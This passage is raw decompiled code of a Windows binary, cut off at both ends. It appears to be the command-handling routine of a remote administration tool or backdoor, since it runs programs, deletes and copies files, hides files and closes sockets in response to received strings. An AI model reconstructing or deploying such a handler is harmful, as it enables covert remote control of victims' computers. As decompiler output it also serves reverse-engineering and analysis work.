var_4c0h;\n    int32_t var_4bch;\n    uint var_4b8h;\n    int32_t var_4b4h;\n    uint var_4b0h;\n    int32_t var_4ach;\n    uint var_4a8h;\n    uint var_4a4h;\n    uint *var_4a0h;\n    uint *var_49ch;\n    int32_t *var_498h;\n    uint *var_494h;\n    int32_t *var_490h;\n    uint var_48ch;\n    int32_t *var_488h;\n    uint *var_484h;\n    int32_t *var_480h;\n    uint var_47ch;\n    int32_t *var_478h;\n    uint *var_474h;\n    int32_t *var_470h;\n    int32_t *var_46ch;\n    int32_t *var_468h;\n    int32_t *var_464h;\n    int32_t *var_460h;\n    uint *var_45ch;\n    int32_t *var_458h;\n    uint *var_454h;\n    int32_t *var_450h;\n    uint *var_44ch;\n    int32_t *var_448h;\n    int32_t *var_444h;\n    uint *var_440h;\n    uint *var_43ch;\n    uint *var_438h;\n    uint *var_434h;\n    int32_t var_430h;\n    int32_t var_42ch;\n    int32_t var_428h;\n    uint *var_424h;\n    uint *var_420h;\n    uint *var_41ch;\n    uint *var_418h;\n    uint *var_414h;\n    int32_t *var_410h;\n    uint *var_40ch;\n    uint *var_408h;\n    uint *var_404h;\n    uint *var_400h;\n    uint *var_3fch;\n    uint *var_3f8h;\n    uint *var_3f4h;\n    uint *var_3f0h;\n    uint *var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint *var_3e0h;\n    uint *var_3dch;\n    uint *var_3d8h;\n    uint *var_3d4h;\n    uint *var_3d0h;\n    uint *var_3cch;\n    uint *var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint *var_3bch;\n    uint *var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint *var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint *var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint *var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint *var_388h;\n    uint var_384h;\n    uint var_380h;\n    uint32_t var_37ch;\n    uint *var_378h;\n    uint *var_374h;\n    uint *var_370h;\n    uint *var_36ch;\n    uint *var_368h;\n    uint *var_364h;\n    int32_t var_360h;\n    uint *var_35ch;\n    uint *var_358h;\n    uint *var_354h;\n    uint *var_350h;\n    int32_t var_34ch;\n    uint *var_348h;\n    uint *var_344h;\n    uint *var_340h;\n    uint *var_33ch;\n    int32_t var_338h;\n    uint *var_334h;\n    uint *var_330h;\n    uint *var_32ch;\n    uint *var_328h;\n    uint *var_324h;\n    uint *var_320h;\n    uint *var_31ch;\n    uint *var_318h;\n    uint *var_314h;\n    uint *var_310h;\n    uint *var_30ch;\n    uint *var_308h;\n    uint *var_304h;\n    uint var_300h;\n    uint *var_2fch;\n    uchar *var_2f8h;\n    uint *var_2f4h;\n    uint *var_2f0h;\n    uint *var_2ech;\n    uint *var_2e8h;\n    uint *var_2e4h;\n    uint *var_2e0h;\n    uint *var_2dch;\n    uint *var_2d8h;\n    uint *var_2d4h;\n    uint *var_2d0h;\n    uint *var_2cch;\n    uint *var_2c8h;\n    uint *var_2c4h;\n    int32_t var_2c0h;\n    uint var_2bch;\n    uint *var_2b8h;\n    uint var_2b4h;\n    int32_t var_2b0h;\n    uint *var_2ach;\n    uint var_2a8h;\n    int32_t var_2a4h;\n    uint var_2a0h;\n    uint *var_29ch;\n    uint *var_298h;\n    uint *var_294h;\n    uint *var_290h;\n    uint *var_28ch;\n    uint *var_288h;\n    uint *var_284h;\n    uint *var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint *var_274h;\n    uint *var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint *var_260h;\n    uint *var_25ch;\n    uint *var_258h;\n    uint var_254h;\n    int32_t var_250h;\n    int32_t var_24ch;\n    int32_t var_248h;\n    uint var_244h;\n    uint *var_240h;\n    uint var_23ch;\n    uint *var_238h;\n    uint var_234h;\n    uint var_230h;\n    int32_t var_22ch;\n    uint var_228h;\n    uint *var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint *var_218h;\n    uint var_214h;\n    int32_t var_210h;\n    uint *var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint *var_200h;\n    uint lpBuffer;\n    uint var_1f8h;\n    uint *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uint *puStack492;\n    uint uStack488;\n    uint uStack484;\n    uint *puStack480;\n    uint *puStack476;\n    uint *puStack472;\n    uint uStack468;\n    uint *puStack464;\n    uint *puStack460;\n    uint *puStack456;\n    uint *puStack452;\n    uint *var_1bch;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    int32_t *var_1a8h;\n    uint *puStack424;\n    uint *puStack420;\n    uint uStack416;\n    uint var_198h;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint32_t var_188h;\n    uint *puStack392;\n    uint *puStack388;\n    uchar *arg_8h_02;\n    uint *var_38h;\n    uint *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *var_28h;\n    int32_t iStack40;\n    uint uStack36;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    arg_8h_02 = &stack0xfffffffc;\n    arg_8h_01 = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    puVar14 = &stack0xfffffffc;\n    arg_8h = &stack0xfffffffc;\n    puVar13 = &stack0xfffffffc;\n    puVar12 = &stack0xfffffffc;\n    var_ch = 0xed;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_1ch = 0x4760c2;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = in_EAX;\n    fcn.004059cc();\n    var_1ch = 0x4760d3;\n    fcn.00405fe8();\n    uStack36 = 0x47d27b;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar11 = true;\n    uStack48 = 0x47d13e;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x4760fc;\n    var_1ch = &stack0xfffffffc;\n    fcn.00405974();\n    if (uVar11) {\n        puStack56 = 0x476108;\n        fcn.00475e2c();\n    }\n    puStack56 = &fcn.004760a4::var_200h;\n    var_38h = 0x476121;\n    fcn.00405a44();\n    var_38h = 0x476131;\n    fcn.00405974();\n    if (uVar11) {\n        var_38h = 0x476145;\n        fcn.00405a84();\n        var_38h = 0x47614d;\n        fcn.0048b42c();\n        *in_FS_OFFSET = puStack56;\n        goto code_r0x0047d148;\n    }\n    var_38h = &fcn.004760a4::var_204h;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00409edc();\n        fcn.00488d04();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00405584();\n        fcn.0048cf38();\n        fcn.0040ef44(&fcn.004760a4::var_20ch, *0x47d2f0);\n        fcn.004055c8();\n        cVar1 = fcn.0048d0a4();\n        if (cVar1 == '\\0') {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        fcn.0048cfb4();\n        if (var_210h == 0) {\n            fcn.00405530();\n        }\n        else {\n            fcn.004055c8();\n        }\n        fcn.00460a58();\n        fcn.00409d70();\n        fcn.0048ceb0();\n        fcn.0048ce74();\n        uVar3 = fcn.0048a114();\n        uVar11 = 1;\n        fcn.00409e5c(uVar3);\n        fcn.0048d3c4();\n        fcn.0048d704();\n        fcn.0040a5a0();\n        fcn.0048b908();\n        fcn.0048ceec();\n        fcn.0048dd0c();\n        fcn.0048dc30();\n        fcn.004058e0();\n        fcn.00475e2c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048cfb4();\n        if (var_24ch == 0) {\n            fcn.00405530();\n        }\n        else {\n            fcn.004055c8();\n        }\n        uVar3 = fcn.0048a114();\n        uVar11 = 1;\n        fcn.00409e5c(uVar3);\n        fcn.0048dd0c();\n        fcn.0048cf38();\n        fcn.004058e0();\n        fcn.00475e2c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.user32.dll_MessageBoxA_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046d854();\n        fcn.00405864();\n        fcn.00475e2c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046d854();\n        fcn.00405864();\n        fcn.00475e2c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00488be0();\n        fcn.00405864();\n        fcn.00475e2c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack388 = 0x4767b4;\n        fcn.0046d400();\n        puStack388 = 0x4767c5;\n        fcn.00475fd8(arg_8h_02);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0048adcc();\n        fcn.00405864();\n        fcn.00475e2c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048adcc();\n        fcn.00405864();\n        fcn.00475e2c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        while( true ) {\n            iVar4 = fcn.00483f50();\n            uVar11 = iVar4 == 0;\n            if (iVar4 < 1) break;\n            fcn.00483f50();\n            fcn.00484388();\n        }\n        sub.kernel32.dll_GetCurrentProcessId();\n        fcn.00484388();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack388 = 0x476897;\n        sub.wsock32.dll_closesocket();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004735e8();\n        fcn.00405974();\n        if (uVar11) {\n            puStack388 = **0x49487c;\n            puStack392 = 0x47d538;\n            var_188h = 0x476927;\n            fcn.004058e0();\n            var_188h = 0x476932;\n            fcn.0046d36c();\n        }\n        else {\n            uVar11 = 1;\n            puStack388 = 0x4768de;\n            fcn.0040f234();\n            puStack388 = var_2a0h;\n            puStack392 = 0x47d538;\n            var_188h = 0x4768f9;\n            fcn.004058e0();\n            var_188h = 0x476904;\n            fcn.0046d36c();\n        }\n        var_188h = 0x476937;\n        sub.kernel32.dll_GetCurrentProcessId();\n        var_188h = 0x47693c;\n        fcn.00484388();\n    }\n    puStack388 = 0x476955;\n    fcn.00405a44();\n    puStack388 = 0x476965;\n    fcn.00405974();\n    if (uVar11) {\n        puStack388 = 0x476979;\n        fcn.00405a84();\n        puStack388 = 0x476985;\n        cVar1 = fcn.0048a218();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            puStack388 = 0x476993;\n            fcn.00475e2c();\n        }\n    }\n    puStack388 = &fcn.004760a4::var_2ach;\n    puStack392 = 0x4769ac;\n    fcn.00405a44();\n    puStack392 = 0x4769bc;\n    fcn.00405974();\n    if (uVar11) {\n        puStack392 = 0x4769d4;\n        fcn.00405a84();\n        puStack392 = &fcn.004760a4::var_ch;\n        var_188h = 0x4769e5;\n        fcn.00405b28();\n        var_188h = 0x4769f5;\n        fcn.00405a44();\n        var_188h = 0x476a02;\n        fcn.00405b28();\n        var_188h = 0x476a11;\n        fcn.00405a84();\n        var_188h = 0x476a1c;\n        fcn.004055c8();\n        var_188h = 0x476a2a;\n        fcn.00409b7c();\n        if (var_2b0h == 0) {\n            var_188h = 5;\n            uStack400 = 0x476a8e;\n            fcn.0040a5a0();\n            uStack400 = 0x476a99;\n            uStack400 = fcn.004059dc();\n            uStack404 = 0;\n            uStack408 = 0x476aa4;\n            uStack408 = fcn.004059dc();\n            var_198h = 0x47d3d4;\n            uStack416 = 0;\n            puStack420 = 0x476ab1;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack420 = 0x476ac0;\n                fcn.00475e2c();\n            }\n        }\n        else {\n            var_188h = 5;\n            uStack400 = 0x476a43;\n            fcn.0040a5a0();\n            uStack400 = 0x476a4e;\n            uStack400 = fcn.004059dc();\n            uStack404 = 0x476a57;\n            uStack404 = fcn.004059dc();\n            uStack408 = 0x476a60;\n            uStack408 = fcn.004059dc();\n            var_198h = 0x47d3d4;\n            uStack416 = 0;\n            puStack420 = 0x476a6d;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack420 = 0x476a7c;\n                fcn.00475e2c();\n            }\n        }\n    }\n    puStack420 = &fcn.004760a4::var_2bch;\n    puStack424 = 0x476ad9;\n    fcn.00405a44();\n    puStack424 = 0x476ae9;\n    fcn.00405974();\n    if (uVar11) {\n        puStack424 = 0x476b01;\n        fcn.00405a84();\n        puStack424 = &fcn.004760a4::var_ch;\n        var_1a8h = 0x476b12;\n        fcn.00405b28();\n        var_1a8h = 0x476b22;\n        fcn.00405a44();\n        var_1a8h = 0x476b2f;\n        fcn.00405b28();\n        var_1a8h = 0x476b3e;\n        fcn.00405a84();\n        var_1a8h = 0x476b49;\n        fcn.004055c8();\n        var_1a8h = 0x476b57;\n        fcn.00409b7c();\n        if (var_2c0h == 0) {\n            var_1a8h = NULL;\n            uStack432 = 0x476bbb;\n            fcn.0040a5a0();\n            uStack432 = 0x476bc6;\n            uStack432 = fcn.004059dc();\n            uStack436 = 0;\n            uStack440 = 0x476bd1;\n            uStack440 = fcn.004059dc();\n            uStack444 = 0x47d3d4;\n            var_1bch = NULL;\n            puStack452 = 0x476bde;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack452 = 0x476bed;\n                fcn.00475e2c();\n            }\n        }\n        else {\n            var_1a8h = NULL;\n            uStack432 = 0x476b70;\n            fcn.0040a5a0();\n            uStack432 = 0x476b7b;\n            uStack432 = fcn.004059dc();\n            uStack436 = 0x476b84;\n            uStack436 = fcn.004059dc();\n            uStack440 = 0x476b8d;\n            uStack440 = fcn.004059dc();\n            uStack444 = 0x47d3d4;\n            var_1bch = NULL;\n            puStack452 = 0x476b9a;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack452 = 0x476ba9;\n                fcn.00475e2c();\n            }\n        }\n    }\n    puStack452 = &fcn.004760a4::var_2cch;\n    puStack456 = 0x476c06;\n    fcn.00405a44();\n    puStack456 = 0x476c16;\n    fcn.00405974();\n    if (uVar11) {\n        puStack456 = 0x476c2a;\n        fcn.00405a84();\n        puStack456 = &fcn.004760a4::var_ch;\n        puStack460 = 0x476c3b;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        puStack460 = 0x476c4b;\n        fcn.00405a44();\n        puStack460 = 0x476c58;\n        fcn.00405b28();\n        puStack460 = 0x476c67;\n        fcn.00405a84();\n        puStack460 = 0x476c6f;\n        fcn.00409edc();\n        puStack460 = 0x476c79;\n        fcn.0048a2c0();\n    }\n    puStack460 = &fcn.004760a4::var_2d0h;\n    puStack464 = 0x476c92;\n    fcn.00405a44();\n    puStack464 = 0x476ca2;\n    fcn.00405974();\n    if (uVar11) {\n        puStack464 = 0x476cba;\n        fcn.00405a84();\n        puStack464 = &fcn.004760a4::var_ch;\n        uStack468 = 0x476ccb;\n        fcn.00405b28();\n        uStack468 = 0x476cdb;\n        fcn.00405a44();\n        uStack468 = 0x476ce8;\n        fcn.00405b28();\n        uStack468 = 0x476cf7;\n        fcn.00405a84();\n        uStack468 = 0x476cff;\n        iVar4 = fcn.00409edc();\n        uVar11 = iVar4 == 1;\n        if (iVar4 < 2) {\n            uStack468 = 0x476d88;\n            uStack468 = fcn.004059dc();\n            puStack472 = 0x476d8e;\n            sub.kernel32.dll_DeleteFileA();\n        }\n        else {\n            uStack468 = 0x476d0a;\n            iVar4 = fcn.00409edc();\n            uVar11 = iVar4 == 0;\n            if (-1 < iVar4) {\n                iVar4 = iVar4 + 1;\n                iVar10 = 0;\n                do {\n                    puStack472 = 0x476d1b;\n                    iVar6 = fcn.00409edc();\n                    if (iVar10 == iVar6) {\n                        puStack472 = 0x476d27;\n                        uStack468 = fcn.004059dc();\n                        puStack476 = 0x476d2d;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    else {\n                        puStack472 = &fcn.004760a4::var_10h;\n                        puStack476 = 0x476d40;\n                        fcn.00405b28();\n                        puStack476 = 0x476d50;\n                        fcn.00405a44();\n                        puStack476 = 0x476d5d;\n                        fcn.00405b28();\n                        puStack476 = 0x476d6c;\n                        fcn.00405a84();\n                        puStack476 = 0x476d74;\n                        uStack468 = fcn.004059dc();\n                        puStack480 = 0x476d7a;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    iVar10 = iVar10 + 1;\n                    iVar4 = iVar4 + -1;\n                    uVar11 = iVar4 == 0;\n                } while (!uVar11);\n            }\n        }\n    }\n    puStack472 = &fcn.004760a4::var_2d4h;\n    puStack476 = 0x476da7;\n    fcn.00405a44();\n    puStack476 = 0x476db7;\n    fcn.00405974();\n    if (uVar11) {\n        puStack476 = 0x476dcf;\n        fcn.00405a84();\n        puStack476 = &fcn.004760a4::var_ch;\n        puStack480 = 0x476de0;\n        fcn.00405b28();\n        puStack480 = 0x476df0;\n        fcn.00405a44();\n        puStack480 = 0x476dfd;\n        fcn.00405b28();\n        puStack480 = 0x476e0c;\n        fcn.00405a84();\n        puStack480 = 0x476e14;\n        iVar4 = fcn.00409edc();\n        uVar11 = iVar4 == 1;\n        if (iVar4 < 2) {\n            puStack480 = 0x476e91;\n            fcn.0048a3c8();\n        }\n        else {\n            puStack480 = 0x476e1f;\n            iVar4 = fcn.00409edc();\n            uVar11 = iVar4 == 0;\n            if (-1 < iVar4) {\n                iVar4 = iVar4 + 1;\n                iVar10 = 0;\n                do {\n                    puStack480 = 0x476e30;\n                    iVar6 = fcn.00409edc();\n                    if (iVar10 == iVar6) {\n                        puStack480 = 0x476e3c;\n                        fcn.0048a3c8();\n                    }\n                    else {\n                        puStack476 = &fcn.004760a4::var_10h;\n                        uStack484 = 0x476e4f;\n                        fcn.00405b28();\n                        uStack484 = 0x476e5f;\n                        fcn.00405a44();\n                        uStack484 = 0x476e6c;\n                        fcn.00405b28();\n                        uStack484 = 0x476e7b;\n                        fcn.00405a84();\n                        uStack484 = 0x476e83;\n                        fcn.0048a3c8();\n                    }\n                    iVar10 = iVar10 + 1;\n                    iVar4 = iVar4 + -1;\n                    uVar11 = iVar4 == 0;\n                } while (!uVar11);\n            }\n        }\n    }\n    puStack480 = 0x476e9e;\n    fcn.00405974();\n    if (uVar11) {\n        puStack480 = 0x476ea5;\n        fcn.0048a46c();\n    }\n    puStack480 = &fcn.004760a4::var_2d8h;\n    uStack484 = 0x476ebe;\n    fcn.00405a44();\n    uStack484 = 0x476ece;\n    fcn.00405974();\n    if (uVar11) {\n        uStack484 = 0x476ee2;\n        fcn.00405a84();\n        uStack484 = 0x80;\n        uStack488 = 0x476eef;\n        uStack488 = fcn.004059dc();\n        puStack492 = 0x476ef5;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack492 = &fcn.004760a4::var_2dch;\n    uStack496 = 0x476f0e;\n    fcn.00405a44();\n    uStack496 = 0x476f1e;\n    fcn.00405974();\n    if (uVar11) {\n        uStack496 = 0x476f32;\n        fcn.00405a84();\n        uStack496 = 2;\n        uStack500 = 0x476f3c;\n        uStack500 = fcn.004059dc();\n        puStack504 = 0x476f42;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack504 = &fcn.004760a4::var_2e0h;\n    var_1f8h = 0x476f5b;\n    fcn.00405a44();\n    var_1f8h = 0x476f6b;\n    fcn.00405974();\n    if (uVar11) {\n        var_1f8h = 0x476f7f;\n        fcn.00405a84();\n        var_1f8h = 1;\n        lpBuffer = 0x476f89;\n        lpBuffer = fcn.004059dc();\n        var_200h = 0x476f8f;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_200h = &fcn.004760a4::var_2e4h;\n    var_204h = 0x476fa8;\n    fcn.00405a44();\n    var_204h = 0x476fb8;\n    fcn.00405974();\n    if (uVar11) {\n        var_204h = 0x476fcc;\n        fcn.00405a84();\n        var_204h = 4;\n        var_208h = 0x476fd6;\n        var_208h = fcn.004059dc();\n        var_20ch = 0x476fdc;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_20ch = &fcn.004760a4::var_2e8h;\n    var_210h = 0x476ff5;\n    fcn.00405a44();\n    var_210h = 0x477005;\n    fcn.00405974();\n    if (uVar11) {\n        var_210h = 0x477019;\n        fcn.00405a84();\n        var_210h = 0x20;\n        var_214h = 0x477023;\n        var_214h = fcn.004059dc();\n        var_218h = 0x477029;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_218h = &fcn.004760a4::var_2ech;\n    var_21ch = 0x477042;\n    fcn.00405a44();\n    var_21ch = 0x477052;\n    fcn.00405974();\n    if (uVar11) {\n        var_21ch = 0x477066;\n        fcn.00405a84();\n        var_21ch = 0x100;\n        var_220h = 0x477073;\n        var_220h = fcn.004059dc();\n        var_224h = 0x477079;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_224h = &fcn.004760a4::var_2f0h;\n    var_228h = 0x477092;\n    fcn.00405a44();\n    var_228h = 0x4770a2;\n    fcn.00405974();\n    if (uVar11) {\n        var_228h = 0x4770ba;\n        fcn.00405a84();\n        var_228h = 0x4770cd;\n        fcn.0040a488();\n        uVar5 = var_188h;\n        if ((var_188h & 2) == 0) {\n            var_228h = 0x4770f7;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x4770e8;\n            fcn.004055c8();\n        }\n        if ((uVar5 & 1) == 0) {\n            var_228h = 0x47711b;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x47710c;\n            fcn.004055c8();\n        }\n        if ((uVar5 & 0x20) == 0) {\n            var_228h = 0x47713f;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x477130;\n            fcn.004055c8();\n        }\n        uVar11 = (uVar5 & 4) == 0;\n        if (uVar11) {\n            var_228h = 0x477163;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x477154;\n            fcn.004055c8();\n        }\n        var_228h = 0x47d708;\n        var_22ch = var_8h;\n        var_230h = 0x47d720;\n        var_234h = 0x47d72c;\n        var_238h = var_ch;\n        var_23ch = 0x47d748;\n        var_240h = var_10h;\n        var_244h = 0x47d748;\n        var_248h = var_14h;\n        var_24ch = 0x47d748;\n        var_250h = var_18h;\n        var_254h = 0x47d754;\n        var_258h = 0x4771a5;\n        fcn.004058e0();\n        var_258h = 0x4771b0;\n        fcn.00475e2c();\n    }\n    var_258h = &fcn.004760a4::var_2f8h;\n    var_25ch = 0x4771c9;\n    fcn.00405a44();\n    var_25ch = 0x4771d9;\n    fcn.00405974();\n    if (uVar11) {\n        var_25ch = 0x4771f1;\n        fcn.00405a84();\n        uVar11 = **0x494940 == 0;\n        if (!uVar11) {\n            var_25ch = &fcn.004760a4::var_ch;\n            var_260h = 0x477215;\n            fcn.00405b28();\n            var_260h = 0x477229;\n            fcn.00405a44();\n            var_260h = 0x47723b;\n            fcn.00405b28();\n            var_260h = 0x47724c;\n            fcn.00405a84();\n            var_260h = &fcn.004760a4::var_2fch;\n            var_264h = 0x477265;\n            iVar4 = fcn.00405b28();\n            uVar11 = iVar4 == 1;\n            var_264h = 0x477279;\n            fcn.00405a44();\n            var_264h = 0x477284;\n            iVar4 = fcn.00409edc();\n            var_264h = 0x477298;\n            fcn.00405b28();\n            var_264h = 0x4772a9;\n            fcn.00405a84();\n            var_264h = 0x4772b9;\n            fcn.004055c8();\n            var_264h = 0x4772c6;\n            fcn.00405974();\n            if (uVar11) {\n                uVar11 = iVar4 == 1;\n                if (iVar4 < 2) {\n                    var_264h = 0xffffffff;\n                    var_268h = 0x47744c;\n                    fcn.0040a68c();\n                    var_268h = 0x477460;\n                    fcn.00405864();\n                    var_268h = 0x47746b;\n                    var_268h = fcn.004059dc();\n                    var_26ch = 0x477474;\n                    var_26ch = fcn.004059dc();\n                    var_270h = 0x47747a;\n                    sub.kernel32.dll_CopyFileA();\n                    var_270h = 0x477482;\n                    var_270h = fcn.004059dc();\n                    var_274h = 0x477488;\n                    sub.kernel32.dll_DeleteFileA();\n                }\n                else {\n                    uVar11 = iVar4 == 0;\n                    if (0 < iVar4) {\n                        iVar6 = 1;\n                        iVar10 = iVar4;\n                        do {\n                            if (iVar4 == iVar6) {\n                                var_270h = 0xffffffff;\n                                var_274h = 0x4773f3;\n                                fcn.0040a68c();\n                                var_274h = 0x477407;\n                                fcn.00405864();\n                                var_274h = 0x477412;\n                                var_274h = fcn.004059dc();\n                                var_278h = 0x47741b;\n                                var_278h = fcn.004059dc();\n                                var_27ch = 0x477421;\n                                sub.kernel32.dll_CopyFileA();\n                                var_27ch = 0x477429;\n                                var_26ch = fcn.004059dc();\n                                var_280h = 0x47742f;\n                                sub.kernel32.dll_DeleteFileA();\n                            }\n                            else {\n                                var_270h = 0xffffffff;\n                                var_274h = &fcn.004760a4::var_308h;\n                                var_278h = 0x477302;\n                                fcn.00405b28();\n                                var_278h = 0x477312;\n                                fcn.00405a44();\n                                var_278h = 0x477323;\n                                fcn.0040a68c();\n                                var_278h = 0x477337;\n                                fcn.00405864();\n                                var_278h = 0x477342;\n                                var_278h = fcn.004059dc();\n                                var_27ch = &fcn.004760a4::var_30ch;\n                                var_280h = 0x477357;\n                                fcn.00405b28();\n                                var_280h = 0x477367;\n                                fcn.00405a44();\n                                var_280h = 0x477372;\n                                var_280h = fcn.004059dc();\n                                var_284h = 0x477378;\n                                sub.kernel32.dll_CopyFileA();\n                                var_284h = &fcn.004760a4::var_310h;\n                                var_288h = 0x47738c;\n                                fcn.00405b28();\n                                var_288h = 0x47739c;\n                                fcn.00405a44();\n                                var_1bch = var_310h;\n                                var_288h = 0x4773b3;\n                                var_26ch = fcn.004059dc();\n                                var_28ch = 0x4773b9;\n                                iVar7 = sub.kernel32.dll_DeleteFileA();\n                                puStack452 = puStack452 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n                                var_28ch = 0x4773d2;\n                                fcn.00405b28();\n                                var_28ch = 0x4773e1;\n                                fcn.00405a84();\n                            }\n                            iVar6 = iVar6 + 1;\n                            iVar10 = iVar10 + -1;\n                            uVar11 = iVar10 == 0;\n                        } while (!uVar11);\n                    }\n                }\n            }\n            else {\n                uVar11 = iVar4 == 1;\n                if (iVar4 < 2) {\n                    var_264h = 0xffffffff;\n                    var_268h = 0x4775af;\n                    fcn.0040a68c();\n                    var_268h = 0x4775c3;\n                    fcn.00405864();\n                    var_268h = 0x4775ce;\n                    var_268h = fcn.004059dc();\n                    var_26ch = 0x4775d7;\n                    var_26ch = fcn.004059dc();\n                    var_270h = 0x4775dd;\n                    sub.kernel32.dll_CopyFileA();\n                }\n                else {\n                    uVar11 = iVar4 == 0;\n                    if (0 < iVar4) {\n                        iVar6 = 1;\n                        iVar10 = iVar4;\n                        do {\n                            if (iVar4 == iVar6) {\n                                var_270h = 0xffffffff;\n                                var_274h = 0x477567;\n                                fcn.0040a68c();\n                                var_274h = 0x47757b;\n                                fcn.00405864();\n                                var_274h = 0x477586;\n                                var_274h = fcn.004059dc();\n                                var_278h = 0x47758f;\n                                var_26ch = fcn.004059dc();\n                                var_27ch = 0x477595;\n                                sub.kernel32.dll_CopyFileA();\n                            }\n                            else {\n                                var_270h = 0xffffffff;\n                                var_274h = &fcn.004760a4::var_32ch;\n                                var_278h = 0x4774c3;\n                                fcn.00405b28();\n                                var_278h = 0x4774d3;\n                                fcn.00405a44();\n                                var_278h = 0x4774e4;\n                                fcn.0040a68c();\n                                var_278h = 0x4774f8;\n                                fcn.00405864();\n                                var_278h = 0x477503;\n                                var_278h = fcn.004059dc();\n                                var_27ch = &fcn.004760a4::var_330h;\n                                var_280h = 0x477518;\n                                fcn.00405b28();\n                                var_280h = 0x477528;\n                                fcn.00405a44();\n                                var_280h = 0x477533;\n                                var_26ch = fcn.004059dc();\n                                var_284h = 0x477539;\n                                sub.kernel32.dll_CopyFileA();\n                                var_284h = 0x477546;\n                                fcn.00405b28();\n                                var_284h = 0x477555;\n                                fcn.00405a84();\n                            }\n                            iVar6 = iVar6 + 1;\n                            iVar10 = iVar10 + -1;\n                            uVar11 = iVar10 == 0;\n                        } while (!uVar11);\n                    }\n                }\n            }\n            var_270h = 0x4775e7;\n            fcn.00405530();\n            var_270h = 0x4775f1;\n            fcn.00475e2c();\n        }\n    }\n    var_270h = &fcn.004760a4::var_344h;\n    var_274h = 0x47760a;\n    fcn.00405a44();\n    var_274h = 0x47761a;\n    fcn.00405974();\n    if (uVar11) {\n        var_274h = 0x47762e;\n        fcn.00405a84();\n        var_274h = 0x47763b;\n        fcn.00405584();\n    }\n    var_274h = &fcn.004760a4::var_348h;\n    var_278h = 0x477654;\n    fcn.00405a44();\n    var_278h = 0x477664;\n    fcn.00405974();\n    if (uVar11) {\n        